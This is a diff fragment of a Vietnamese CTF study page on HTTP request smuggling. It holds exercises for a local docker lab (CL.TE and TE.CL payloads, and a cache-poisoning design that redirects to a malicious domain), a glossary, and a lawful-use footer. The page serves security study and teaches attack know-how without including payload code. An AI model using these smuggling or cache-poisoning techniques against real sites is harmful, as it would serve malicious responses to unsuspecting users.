+    <tr><td>❌</td><td>App chỉ có 1 lớp server duy nhất (không có reverse proxy/CDN phía trước) — không có "2 cách hiểu" để lợi dụng.</td></tr>
+    <tr><td>❌</td><td>Hạ tầng đã chuyển hoàn toàn sang HTTP/2 giữa các lớp — vấn đề ambiguity CL/TE là đặc thù của HTTP/1.1, HTTP/2 dùng cách đóng gói khác (binary framing) không có lỗ hổng này.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 2 server đơn giản (vd Nginx làm proxy trỏ về 1 Flask app) trên máy, thử
+  gửi payload CL.TE bằng socket thô, quan sát hiệu ứng.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>docker-compose</code> với 2 container (nginx + flask) để
+  dựng nhanh môi trường test, tránh ảnh hưởng hệ thống thật.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thử chiều ngược lại TE.CL (mục 06.B) trên cùng môi trường, so sánh hiệu
+  ứng khác CL.TE thế nào.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Chú ý độ dài chunk phải ghi ĐÚNG dạng HEX (vd <code>5c</code> không
+  phải <code>92</code> dù cùng là số 92 thập phân).</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> thay vì nhồi request ẩn ảnh hưởng người dùng khác, thiết kế cách dùng cùng
+  kỹ thuật này để làm <strong>Cache Poisoning</strong> — khiến server LƯU 1 response độc vào cache dùng chung
+  cho MỌI người truy cập trang chủ.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhồi request ẩn là 1 request tới CHÍNH trang chủ nhưng có thêm
+  header/path đặc biệt khiến response trả về khác thường (vd redirect tới domain độc) — nếu cache key của CDN
+  không tính đến phần "đặc biệt" đó, mọi người sau sẽ nhận NHẰM response độc đã bị lưu cache.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>CL.TE / TE.CL</td><td>Ký hiệu chỉ 2 kiểu bất đồng giữa header Content-Length và Transfer-Encoding ở 2 lớp server.</td></tr>
+    <tr><td>Chunked encoding</td><td>Cách gửi body HTTP chia theo từng đoạn (chunk) có ghi độ dài riêng, kết thúc bằng chunk độ dài 0.</td></tr>
+    <tr><td>Cache Poisoning</td><td>Khiến server lưu 1 response sai/độc vào cache rồi phát lại cho nhiều người dùng khác.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ offline:</strong> <code>~/hoc/CTF/Tools/web/smuggler/</code>, Burp
+  extension "HTTP Request Smuggler" (cần cài qua BApp Store trước ngày thi).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("smuggle-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("smuggle-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
